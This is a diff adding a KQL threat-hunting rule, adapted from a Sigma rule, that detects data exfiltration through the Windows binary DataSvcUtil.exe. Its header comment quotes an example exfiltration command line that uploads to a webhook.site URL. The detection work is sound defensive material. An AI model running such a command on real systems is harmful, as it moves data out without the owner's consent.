@@ -1,0 +1,17 @@
+// Title: Data Exfiltration by DataSvcUtil.exe
+// Desc: Detects when a user performs data exfiltration by using DataSvcUtil.exe
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/
+// Ref - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6
+// Ref - https://github.com/12306Bro/Threathunting-book (渗出)
+// MITRE: https://attack.mitre.org/techniques/T1567/ (Exfiltration: Exfiltration Over Web Service)
+// Severity: high
+// Trigger: DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
+// Usecase: Upload file
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
+// By: Frankie Li
+// On: 05-05-2023
+DeviceProcessEvents 
+| where ((ProcessCommandLine contains @'/in:' or ProcessCommandLine contains @'/out:' 
+    or ProcessCommandLine contains @'/uri:') and (FolderPath endswith @'\DataSvcUtil.exe' 
+    or ProcessVersionInfoOriginalFileName contains @'DataSvcUtil.exe' or InitiatingProcessVersionInfoOriginalFileName contains @'DataSvcUtil.exe'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
